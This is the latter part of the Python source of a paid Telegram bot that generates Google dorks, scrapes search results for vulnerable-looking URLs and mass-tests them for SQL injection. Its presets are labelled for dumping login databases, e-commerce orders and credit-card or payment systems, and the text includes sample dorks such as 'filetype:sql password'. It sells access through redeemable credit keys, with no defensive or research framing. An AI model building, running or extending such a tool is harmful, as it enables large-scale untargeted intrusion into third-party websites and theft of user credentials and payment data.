    "  1️⃣  🔤 Keyword Maker \\→ generate keywords\n"
    "  2️⃣  🛠 Dork Generator \\→ build dorks\n"
    "  3️⃣  🔎 Deep Parser \\→ get real URLs\n"
    "  4️⃣  💉 SQL Tester \\→ find vulns\n\n"
    f"{DIV}"
)

HELP = (
    "❓ *How to Use This Bot*\n"
    f"{DIV}\n\n"
    "🔤 *Keyword Maker*  \\(FREE\\)\n"
    "  Give a site \\(e\\.g\\. `netflix.com`\\)\n"
    "  Bot scrapes Google \\+ expands to UHQ keywords\\.\n"
    "  Set any custom count \\(50\\-5000\\)\\.\n\n"
    "🛠 *Dork Generator*  \\(FREE\\)\n"
    "  3 presets \\(Combo, Shopping, CC SQLi\\)\n"
    "  \\+ Custom Builder with full control\\.\n"
    "  Set any custom count\\.\n\n"
    "🔎 *Deep Parser*  \\(5 credits/dork\\)\n"
    "  Scrapes Google with 5 threads\\.\n\n"
    "💉 *SQL Tester*  \\(5 credits/URL\\)\n"
    "  Tests URLs for SQL injection\\.\n\n"
    f"{DIV}\n"
    "📝 *Commands:*\n"
    "  /start — Main menu\n"
    "  /menu  — Back to menu\n"
    "  /help  — This guide\n"
    "  /balance — Check credits\n"
    "  /redeem `KEY` — Add credits\n"
)

# ──────────────────────────────────────────────
#  COMMAND HANDLERS
# ──────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    get_user(update.effective_user.id)
    await update.message.reply_text(WELCOME, reply_markup=main_menu_kb(), parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    await update.message.reply_text(WELCOME, reply_markup=main_menu_kb(), parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    await update.message.reply_text(HELP, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())

async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    ud = get_user(update.effective_user.id)
    text = (
        f"💰 *Your Balance*\n{DIV}\n\n"
        f"   Credits: `{ud.get('credits',0)}`\n"
        f"   Uses: `{ud.get('uses',0)}`\n\n"
        f"Use /redeem `KEY` to add credits\\."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text(
            "📝 *Usage:* `/redeem YOUR\\-KEY`\n\nExample: `/redeem VENOM\\-A1B2C3D4`",
            parse_mode=ParseMode.MARKDOWN_V2)
        return
    uid = str(update.effective_user.id)
    key = context.args[0].upper()
    if key in active_keys:
        val = active_keys.pop(key)
        ud = get_user(uid)
        ud["credits"] = ud.get("credits", 0) + val
        db[uid] = ud; save_db(db)
        await update.message.reply_text(
            f"✅ *Key Redeemed\\!*\n\n   \\+`{val}` credits\n   Balance: `{ud['credits']}`",
            parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text("❌ *Invalid or expired key\\.*", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_IDS: return
    if not context.args:
        await update.message.reply_text("Usage: /ban USER\\_ID", parse_mode=ParseMode.MARKDOWN_V2); return
    tid = str(context.args[0])
    db[tid] = {"credits": 0, "banned": True}; save_db(db)
    await update.message.reply_text(f"🚫 User `{tid}` banned\\.", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_IDS: return
    if not context.args:
        await update.message.reply_text("Usage: /key AMOUNT"); return
    try:
        val = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Amount must be a number\\."); return
    key = f"VENOM-{uuid.uuid4().hex[:8].upper()}"
    active_keys[key] = val
    await update.message.reply_text(
        f"🔑 *New Key*\n\n   Key: `{key}`\n   Credits: `{val}`",
        parse_mode=ParseMode.MARKDOWN_V2)

# ──────────────────────────────────────────────
#  BUTTON HANDLER
# ──────────────────────────────────────────────

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if is_banned(uid): return
    await q.answer()
    data = q.data

    if data == 'back_menu':
        user_states.pop(uid, None)
        await q.edit_message_text(WELCOME, reply_markup=main_menu_kb(), parse_mode=ParseMode.MARKDOWN_V2)
        return
    if data == '_noop':
        return
    if data == 'show_balance':
        ud = get_user(uid)
        text = (
            f"💰 *Your Balance*\n{DIV}\n\n"
            f"   Credits: `{ud.get('credits',0)}`\n"
            f"   Uses: `{ud.get('uses',0)}`\n\n"
            f"Use /redeem `KEY` to add credits\\."
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())
        return
    if data == 'show_help':
        await q.edit_message_text(HELP, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())
        return

    # ══════════════════════════════════════════
    #  KEYWORD MAKER
    # ══════════════════════════════════════════
    if data == 'mode_kw':
        user_states[uid] = {"mode": "KEYWORD", "step": "count"}
        rows = count_kb("kwcount")
        rows.append([InlineKeyboardButton("⬅️  Back to Menu", callback_data='back_menu')])
        text = (
            f"🔤 *Keyword Maker*\n{DIV}\n\n"
            f"Generates UHQ keywords from any site name\\.\n"
            f"Scrapes Google \\+ algorithmic expansion\\.\n\n"
            f"📊 *How many keywords* to generate?\n\n"
            f"Pick a preset or type a custom number\\.\n\n"
            f"🆓 This is *free* — no credits needed\\!"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    if data.startswith('kwcount_'):
        val = data.replace('kwcount_', '')
        if val == 'custom':
            st = user_states.get(uid, {})
            st.update({"step": "custom_count"})
            user_states[uid] = st
            bk = InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️  Back", callback_data='mode_kw')],
            ])
            await q.edit_message_text(
                f"🔤 *Keyword Maker — Custom Count*\n{DIV}\n\n"
                f"Type a number below \\(e\\.g\\. `1500`\\):\n",
                parse_mode=ParseMode.MARKDOWN_V2, reply_markup=bk)
            return
        max_count = int(val)
        st = user_states.get(uid, {})
        st.update({"step": "site_input", "max_count": max_count})
        user_states[uid] = st
        bk = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️  Change Count", callback_data='mode_kw')],
        ])
        await q.edit_message_text(
            f"🔤 *Keyword Maker — Enter Site*\n{DIV}\n\n"
            f"   Keywords to generate: `{max_count}`\n\n"
            f"✏️ Now send me a *site name or URL*\n\n"
            f"💡 _Examples:_\n"
            f"`netflix.com`\n`spotify`\n`amazon.com`\n",
            parse_mode=ParseMode.MARKDOWN_V2, reply_markup=bk)
        return

    # ── Mode: Parser ──
    if data == 'mode_parse':
        user_states[uid] = {"mode": "PARSER"}
        ud = get_user(uid)
        text = (
            f"🔎 *Deep Parser*\n{DIV}\n\n"
            f"Send me your *dorks* and I'll scrape\n"
            f"Google results using `{PARSER_THREADS}` threads\\.\n\n"
            f"📝 *How to send:*\n"
            f"• Type dorks below \\(one per line\\)\n"
            f"• Or upload a `.txt` file\n\n"
            f"💡 _Example:_\n"
            f"`inurl:php?id=`\n"
            f"`filetype:sql password`\n\n"
            f"💰 Cost: `5` credits/dork\n"
            f"💰 Balance: `{ud.get('credits',0)}`\n"
            f"⚡ Threads: `{PARSER_THREADS}` concurrent"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())
        return

    # ── Mode: SQL ──
    if data == 'mode_sql':
        user_states[uid] = {"mode": "SQL"}
        ud = get_user(uid)
        text = (
            f"💉 *SQL Tester*\n{DIV}\n\n"
            f"Send me *URLs with parameters* and I'll\n"
            f"test each one for SQL injection\\.\n\n"
            f"📝 *How to send:*\n"
            f"• Type URLs below \\(one per line\\)\n"
            f"• Or upload a `.txt` file\n\n"
            f"💡 _Example:_\n"
            f"`http://example.com/page.php?id=1`\n\n"
            f"💰 Cost: `5` credits/URL\n"
            f"💰 Balance: `{ud.get('credits',0)}`"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_kb())
        return

    # ══════════════════════════════════════════
    #  DORK GENERATOR MENU
    # ══════════════════════════════════════════
    if data == 'mode_gen':
        user_states[uid] = {"mode": "GENERATOR", "step": "choose_type"}
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎯  Site Targeted Combo", callback_data='preset_combo')],
            [InlineKeyboardButton("🛒  Shopping SQLi", callback_data='preset_shopping')],
            [InlineKeyboardButton("💳  CC / Payment SQLi", callback_data='preset_cc')],
            [InlineKeyboardButton(f"{DIV}", callback_data='_noop')],
            [InlineKeyboardButton("🛠  Custom Builder", callback_data='custom_start')],
            [InlineKeyboardButton("⬅️  Back to Menu", callback_data='back_menu')],
        ])
        text = (
            f"🛠 *Dork Generator*\n{DIV}\n\n"
            f"Choose a *quick preset* or build custom:\n\n"
            f"🎯 *Site Targeted Combo*\n"
            f"   _SQLi dorks for login/user DB dumping_\n\n"
            f"🛒 *Shopping SQLi*\n"
            f"   _SQLi dorks for e\\-commerce/order dumping_\n\n"
            f"💳 *CC / Payment SQLi*\n"
            f"   _SQLi dorks for payment/billing systems_\n\n"
            f"{DIV}\n"
            f"🛠 *Custom Builder*\n"
            f"   _Full control over dork type, site, params_"
        )
        await q.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── Presets — pick count ──
    if data.startswith('preset_'):
        preset_key = data.replace('preset_', '')
        preset = PRESETS.get(preset_key)
        if not preset: return
        user_states[uid] = {
            "mode": "GENERATOR", "step": "preset_count",
            "gen_type": "preset", "preset": preset_key,
        }
        rows = count_kb(f"pcount_{preset_key}")
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data='mode_gen')])
        text = (
            f"{preset['icon']} *{esc(preset['label'])}*\n{DIV}\n\n"
            f"_{esc(preset['desc'])}_\n\n"
            f"⚙️ *Auto\\-configured:*\n"
            f"   Templates: `{len(preset['templates'])}` patterns\n\n"
            f"📊 *How many dorks* to generate?\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── Preset count → custom or value ──
    if data.startswith('pcount_'):
        parts = data.split('_')
        preset_key = parts[1]
        val = parts[2]
        if val == 'custom':
            st = user_states.get(uid, {})
            st.update({"step": "custom_count", "count_next": "preset_keywords"})
            user_states[uid] = st
            bk = InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️  Back", callback_data=f"preset_{preset_key}")],
            ])
            await q.edit_message_text(
                f"🛠 *Custom Count*\n{DIV}\n\nType a number below \\(e\\.g\\. `2000`\\):\n",
                parse_mode=ParseMode.MARKDOWN_V2, reply_markup=bk)
            return
        max_count = int(val)
        preset = PRESETS.get(preset_key, {})
        st = user_states.get(uid, {})
        st.update({"step": "keywords", "max_count": max_count})
        user_states[uid] = st
        bk = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️  Change Count", callback_data=f"preset_{preset_key}")],
            [InlineKeyboardButton("⬅️  Back to Generator", callback_data='mode_gen')],
        ])
        text = (
            f"{preset.get('icon','')} *{esc(preset.get('label',''))}*\n{DIV}\n\n"
            f"   Templates: `{len(preset.get('templates',[]))}` patterns\n"
            f"   Max dorks: `{max_count}`\n\n"
            f"✏️ Now send me your *keywords*\n"
            f"\\(one per line, or upload a \\.txt file\\)\n\n"
            f"🆓 *Free* — no credits needed\\!"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=bk)
        return

    # ══════════════════════════════════════════
    #  CUSTOM BUILDER
    # ══════════════════════════════════════════
    if data == 'custom_start':
        user_states[uid] = {"mode": "GENERATOR", "step": "cust_dtype", "gen_type": "custom"}
        rows = []
        for key, cat in DORK_CATEGORIES.items():
            rows.append([InlineKeyboardButton(f"{cat['icon']}  {cat['label']}", callback_data=f"cdtype_{key}")])
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data='mode_gen')])
        text = f"🛠 *Custom Builder — Step 1/4*\n{DIV}\n\nChoose the *type of dorks*:\n"
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    if data.startswith("cdtype_"):
        dtype = data.replace("cdtype_", "")
        st = user_states.get(uid, {}); st.update({"step": "cust_site", "dork_type": dtype}); user_states[uid] = st
        cat = DORK_CATEGORIES.get(dtype, {})
        rows = []
        for key, site in SITE_TYPES.items():
            rows.append([InlineKeyboardButton(f"{site['icon']}  {site['label']}", callback_data=f"csite_{key}")])
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data='custom_start')])
        text = (
            f"🛠 *Custom Builder — Step 2/4*\n{DIV}\n\n"
            f"   Dork type: {cat.get('icon','')} *{esc(cat.get('label',''))}*\n\nChoose *site scope*:\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    if data.startswith("csite_"):
        stype = data.replace("csite_", "")
        st = user_states.get(uid, {}); st.update({"step": "cust_param", "site_type": stype}); user_states[uid] = st
        dtype = st.get("dork_type", "all"); cat = DORK_CATEGORIES.get(dtype, {}); site = SITE_TYPES.get(stype, {})
        rows = []
        for key, pp in PAGE_PARAMS.items():
            rows.append([InlineKeyboardButton(f"{pp['icon']}  {pp['label']}", callback_data=f"cparam_{key}")])
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data=f"cdtype_{dtype}")])
        text = (
            f"🛠 *Custom Builder — Step 3/4*\n{DIV}\n\n"
            f"   Dork type: {cat.get('icon','')} *{esc(cat.get('label',''))}*\n"
            f"   Site scope: {site.get('icon','')} *{esc(site.get('label',''))}*\n\nChoose *parameters*:\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    if data.startswith("cparam_"):
        pparam = data.replace("cparam_", "")
        st = user_states.get(uid, {}); st.update({"step": "cust_count", "page_param": pparam}); user_states[uid] = st
        dtype = st.get("dork_type", "all"); stype = st.get("site_type", "any")
        cat = DORK_CATEGORIES.get(dtype, {}); site = SITE_TYPES.get(stype, {}); pp = PAGE_PARAMS.get(pparam, {})
        rows = count_kb("ccount")
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data=f"csite_{stype}")])
        text = (
            f"🛠 *Custom Builder — Step 4/4*\n{DIV}\n\n"
            f"   Dork type: {cat.get('icon','')} *{esc(cat.get('label',''))}*\n"
            f"   Site scope: {site.get('icon','')} *{esc(site.get('label',''))}*\n"
            f"   Parameters: {pp.get('icon','')} *{esc(pp.get('label',''))}*\n\n"
            f"📊 *How many dorks* to generate?\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    if data.startswith("ccount_"):
        val = data.replace("ccount_", "")
        st = user_states.get(uid, {})
        if val == 'custom':
            st.update({"step": "custom_count", "count_next": "custom_keywords"}); user_states[uid] = st
            pparam = st.get("page_param", "none")
            bk = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️  Back", callback_data=f"cparam_{pparam}")]])
            await q.edit_message_text(
                f"🛠 *Custom Count*\n{DIV}\n\nType a number below \\(e\\.g\\. `2000`\\):\n",
                parse_mode=ParseMode.MARKDOWN_V2, reply_markup=bk)
            return
        max_count = int(val)
        st.update({"step": "keywords", "max_count": max_count}); user_states[uid] = st
        dtype = st.get("dork_type", "all"); stype = st.get("site_type", "any"); pparam = st.get("page_param", "none")
        cat = DORK_CATEGORIES.get(dtype, {}); site = SITE_TYPES.get(stype, {}); pp = PAGE_PARAMS.get(pparam, {})
        bk = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️  Change Count", callback_data=f"cparam_{pparam}")],
            [InlineKeyboardButton("⬅️  Start Over", callback_data='mode_gen')],
        ])
        text = (
            f"🛠 *Custom Builder — Send Keywords*\n{DIV}\n\n"
            f"   Dork type: {cat.get('icon','')} *{esc(cat.get('label',''))}*\n"
            f"   Site scope: {site.get('icon','')} *{esc(site.get('label',''))}*\n"
            f"   Parameters: {pp.get('icon','')} *{esc(pp.get('label',''))}*\n"
            f"   Max dorks: `{max_count}`\n\n"
            f"✏️ Send *keywords* \\(text or \\.txt file\\)\n\n"
            f"🆓 *Free* — no credits needed\\!"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=bk)
        return

# ──────────────────────────────────────────────
#  CORE PROCESSING
# ──────────────────────────────────────────────

async def process_input(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list):
    uid = update.effective_user.id
    uid_s = str(uid)
    st = user_states.get(uid, {})
    mode = st.get("mode")
    step = st.get("step")
    logger.info("process: user=%s mode=%s step=%s items=%d", uid_s, mode, step, len(lines))

    if not mode:
        await update.message.reply_text(
            "⚠️ *No mode selected\\!*\n\nTap /start first\\.",
            parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── CUSTOM COUNT INPUT ──
    if step == "custom_count":
        raw = lines[0].strip()
        try:
            num = int(raw)
            if num < 1 or num > 50000:
                await update.message.reply_text("⚠️ Number must be between 1 and 50000\\.", parse_mode=ParseMode.MARKDOWN_V2)
                return
        except ValueError:
            await update.message.reply_text("⚠️ Please send a *valid number*\\.", parse_mode=ParseMode.MARKDOWN_V2)
            return

        count_next = st.get("count_next", "")
        st["max_count"] = num

        if mode == "KEYWORD":
            st["step"] = "site_input"
            user_states[uid] = st
            await update.message.reply_text(
                f"🔤 *Keyword Maker — Enter Site*\n{DIV}\n\n"
                f"   Keywords to generate: `{num}`\n\n"
                f"✏️ Send me a *site name or URL*\n\n"
                f"💡 _Examples:_ `netflix.com`, `spotify`, `amazon`\n",
                parse_mode=ParseMode.MARKDOWN_V2)
            return

        if count_next == "preset_keywords":
            st["step"] = "keywords"
            user_states[uid] = st
            preset_key = st.get("preset", "combo")
            preset = PRESETS.get(preset_key, {})
            await update.message.reply_text(
                f"{preset.get('icon','')} *{esc(preset.get('label',''))}*\n{DIV}\n\n"
                f"   Max dorks: `{num}`\n\n"
                f"✏️ Send *keywords* \\(text or \\.txt file\\)\n",
                parse_mode=ParseMode.MARKDOWN_V2)
            return

        if count_next == "custom_keywords":
            st["step"] = "keywords"
            user_states[uid] = st
            await update.message.reply_text(
                f"🛠 *Custom Builder*\n{DIV}\n\n"
                f"   Max dorks: `{num}`\n\n"
                f"✏️ Send *keywords* \\(text or \\.txt file\\)\n",
                parse_mode=ParseMode.MARKDOWN_V2)
            return
        return

    # ── KEYWORD MAKER — site input ──
    if mode == "KEYWORD" and step == "site_input":
        site_raw = lines[0].strip()
        brand = extract_brand(site_raw)
        max_count = st.get("max_count", 500)
        logger.info("KW: brand='%s' max=%d", brand, max_count)

        status = await update.message.reply_text(
            f"🔤 *Keyword Maker — Starting*\n{DIV}\n\n"
            f"   Site: `{esc(brand)}`\n"
            f"   Target: `{max_count}` keywords\n\n{pbar(0, 1)}\n\n"
            f"⏳ Scraping Google \\+ expanding\\.\\.\\.",
            parse_mode=ParseMode.MARKDOWN_V2)

        kw_sem = get_semaphore(uid)
        async with aiohttp.ClientSession() as session:
            keywords = await generate_keywords(session, brand, max_count, status, kw_sem)

        out = io.BytesIO("\n".join(keywords).encode())
        out.name = f"keywords_{brand}_{len(keywords)}.txt"

        ud = get_user(uid_s)
        ud["uses"] = ud.get("uses", 0) + 1
        db[uid_s] = ud; save_db(db)

        await status.edit_text(
            f"✅ *Keywords Generated\\!*\n{DIV}\n\n"
            f"   Site: `{esc(brand)}`\n"
            f"   Generated: `{len(keywords)}`\n"
            f"   Requested: `{max_count}`\n\n{pbar(1, 1)}\n\n"
            f"📄 File attached below ⬇️",
            parse_mode=ParseMode.MARKDOWN_V2)

        await update.message.reply_document(
            document=out,
            caption=f"🔤 {len(keywords)} UHQ keywords for {brand}")
        return

    # ── GENERATOR ──
    if mode == "GENERATOR":
        if step != "keywords":
            await update.message.reply_text(
                "⚠️ *Please complete the setup first\\!*\n\nUse the buttons above\\.",
                parse_mode=ParseMode.MARKDOWN_V2)
            return

        gen_type = st.get("gen_type", "custom")
        max_count = st.get("max_count", 500)

        if gen_type == "preset":
            preset_key = st.get("preset", "combo")
            preset = PRESETS.get(preset_key, {})
            label = preset.get("label", "Preset"); icon = preset.get("icon", "🛠")
            status = await update.message.reply_text(
                f"{icon} *Generating {esc(label)}\\.\\.\\.*\n{DIV}\n\n"
                f"   Keywords: `{len(lines)}`\n   Max dorks: `{max_count}`\n\n{pbar(0, 1)}",
                parse_mode=ParseMode.MARKDOWN_V2)
            dorks = build_preset_dorks(lines, preset_key, max_count)
        else:
            dtype = st.get("dork_type", "all"); stype = st.get("site_type", "any"); pparam = st.get("page_param", "none")
            cat = DORK_CATEGORIES.get(dtype, {}); site = SITE_TYPES.get(stype, {}); pp = PAGE_PARAMS.get(pparam, {})
            icon = "🛠"; label = "Custom Dorks"
            status = await update.message.reply_text(
                f"🛠 *Generating\\.\\.\\.*\n{DIV}\n\n"
                f"   Type: {cat.get('icon','')} {esc(cat.get('label',''))}\n"
                f"   Scope: {site.get('icon','')} {esc(site.get('label',''))}\n"
                f"   Keywords: `{len(lines)}` | Max: `{max_count}`\n\n{pbar(0, 1)}",
                parse_mode=ParseMode.MARKDOWN_V2)
            dorks = build_custom_dorks(lines, dtype, stype, pparam, max_count)

        out = io.BytesIO("\n".join(dorks).encode())
        out.name = f"dorks_{gen_type}_{len(dorks)}.txt"
        ud = get_user(uid_s); ud["uses"] = ud.get("uses", 0) + 1; db[uid_s] = ud; save_db(db)

        await status.edit_text(
            f"✅ *{esc(label)} — Done\\!*\n{DIV}\n\n"
            f"   Keywords: `{len(lines)}`\n   Dorks: `{len(dorks)}`\n   Limit: `{max_count}`\n\n"
            f"{pbar(1, 1)}\n\n📄 File below ⬇️",
            parse_mode=ParseMode.MARKDOWN_V2)
        await update.message.reply_document(document=out, caption=f"{icon} {len(dorks)} dorks from {len(lines)} keywords")
        return

    # ── PARSER / SQL ──
    cost = len(lines) * 5
    ud = get_user(uid_s); credits = ud.get("credits", 0)
    if credits < cost:
        await update.message.reply_text(
            f"❌ *Not Enough Credits*\n{DIV}\n\n"
            f"   Required: `{cost}` \\({len(lines)} × 5\\)\n   Balance: `{credits}`\n\n"
            f"Use /redeem `KEY` to add more\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    is_parser = mode == "PARSER"
    icon = "🔎" if is_parser else "💉"
    label = "Deep Parser" if is_parser else "SQL Tester"
    item_w = "dorks" if is_parser else "URLs"
    thread_info = f"\n   ⚡ Threads: `{PARSER_THREADS}`\n" if is_parser else "\n"

    queue_len = global_queue.get_queue_length()
    active = global_queue.active
    queue_note = ""
    if active >= global_queue.max:
        queue_pos = queue_len + 1
        queue_note = (
            f"\n\n🚦 *Queue Status:*\n"
            f"   Active: `{active}/{global_queue.max}` slots\n"
            f"   Your position: *\\#{queue_pos}*\n"
            f"   _Your task will start automatically\\._"
        )

    status = await update.message.reply_text(
        f"{icon} *{esc(label)} — {'Queued' if queue_note else 'Running'}*\n{DIV}\n\n"
        f"   Items: `{len(lines)}` {item_w}\n   Cost: `{cost}` credits{thread_info}"
        f"{queue_note}\n\n"
        f"{pbar(0, len(lines))}\n\n⏳ Please wait\\.\\.\\.",
        parse_mode=ParseMode.MARKDOWN_V2)

    results = []; errors = 0; done_count = 0; lock = asyncio.Lock()
    sem = get_semaphore(uid)

    try:
        async with aiohttp.ClientSession() as session:
            if is_parser:
                started = False
                async def _pw(dork):
                    nonlocal done_count, errors, started
                    try:
                        urls = await fetch_oxylabs(session, dork, sem)
                        if isinstance(urls, list):
                            async with lock: results.extend(urls)
                        else:
                            async with lock: errors += 1
                    except Exception as e:
                        logger.error("PW err: %s", e)
                        async with lock: errors += 1
                    async with lock:
                        if not started:
                            started = True
                        done_count += 1
                        d = done_count
                    if d % 2 == 0 or d == len(lines):
                        qi = ""
                        a = global_queue.active
                        if a >= global_queue.max and d < len(lines):
                            qi = f"\n   🚦 Queue: `{a}/{global_queue.max}` slots active\n"
                        try:
                            await status.edit_text(
                                f"{icon} *{esc(label)} — Running*\n{DIV}\n\n"
                                f"   Done: `{d}/{len(lines)}` {item_w}\n   Found: `{len(results)}` URLs\n"
                                f"   ⚡ Threads: `{PARSER_THREADS}`{qi}\n\n{pbar(d, len(lines))}\n\n⏳ Please wait\\.\\.\\.",
                                parse_mode=ParseMode.MARKDOWN_V2)
                        except Exception: pass
                await asyncio.gather(*[_pw(d) for d in lines], return_exceptions=True)
            else:
                for i in range(0, len(lines), 5):
                    chunk = lines[i:i+5]
                    batch = await asyncio.gather(*(check_sql(session, u) for u in chunk), return_exceptions=True)
                    for r in batch:
                        if isinstance(r, Exception): errors += 1
                        elif r: results.append(r)
                    done_count = min(i+5, len(lines))
                    try:
                        await status.edit_text(
                            f"{icon} *{esc(label)} — Running*\n{DIV}\n\n"
                            f"   Scanned: `{done_count}/{len(lines)}` URLs\n   Vulns: `{len(results)}`\n\n"
                            f"{pbar(done_count, len(lines))}\n\n⏳ Please wait\\.\\.\\.",
                            parse_mode=ParseMode.MARKDOWN_V2)
                    except Exception: pass
    except Exception as e:
        logger.error("Session err: %s\n%s", e, traceback.format_exc())
        await status.edit_text(f"❌ *Error*\n{DIV}\n\n`{esc(str(e))}`\n\nCredits *not* deducted\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    ud["credits"] -= cost; ud["uses"] = ud.get("uses", 0) + 1; db[uid_s] = ud; save_db(db)
    final = list(set(results))
    logger.info("%s done: user=%s raw=%d unique=%d credits=%d", mode, uid_s, len(results), len(final), ud["credits"])
    err_note = f"\n   ⚠️ Errors: `{errors}`\n" if errors else ""

    if not final:
        rw = "results" if is_parser else "vulnerabilities"
        await status.edit_text(
            f"{icon} *{esc(label)} — Complete*\n{DIV}\n\n"
            f"   Scanned: `{len(lines)}` {item_w}\n   {esc(rw.title())}: `0`{err_note}\n\n"
            f"{pbar(1, 1)}\n\n💰 Remaining: `{ud['credits']}`", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        tag = "parsed_urls" if is_parser else "sql_vulns"
        f_out = io.BytesIO("\n".join(final).encode())
        f_out.name = f"{tag}_{datetime.now().strftime('%H%M%S')}.txt"
        await status.edit_text(
            f"{icon} *{esc(label)} — Complete*\n{DIV}\n\n"
            f"   Scanned: `{len(lines)}` {item_w}\n   Results: `{len(final)}`{err_note}\n\n"
            f"{pbar(1, 1)}\n\n💰 Remaining: `{ud['credits']}`\n\n📄 File below ⬇️", parse_mode=ParseMode.MARKDOWN_V2)
        await update.message.reply_document(document=f_out, caption=f"{icon} {len(final)} results — credits: {ud['credits']}")

# ──────────────────────────────────────────────
#  INPUT HANDLERS
# ──────────────────────────────────────────────

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    uid = update.effective_user.id
    st = user_states.get(uid, {})
    if not st.get("mode"):
        await update.message.reply_text("⚠️ *No mode selected\\!* Tap /start first\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return
    try:
        tg_file = await context.bot.get_file(update.message.document.file_id)
        raw = await tg_file.download_as_bytearray()
        lines = [l.strip() for l in raw.decode("utf-8").splitlines() if l.strip()]
        if not lines:
            await update.message.reply_text("⚠️ *Empty file\\!*", parse_mode=ParseMode.MARKDOWN_V2)
            return
        await process_input(update, context, lines)
    except Exception as e:
        logger.error("file err: %s\n%s", e, traceback.format_exc())
        await update.message.reply_text(f"❌ *File Error:* `{esc(str(e))}`", parse_mode=ParseMode.MARKDOWN_V2)

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    if not update.message or not update.message.text: return
    uid = update.effective_user.id
    st = user_states.get(uid, {})
    if not st.get("mode"): return
    text = update.message.text.strip()
    if text.startswith("/"): return
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    if not lines: return
    await process_input(update, context, lines)

# ──────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────

if __name__ == "__main__":
    logger.info("Starting bot...")
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).concurrent_updates(True).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("balance", cmd_balance))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("key", cmd_key))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), file_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    logger.info("Bot ready — polling...")
    app.run_polling()
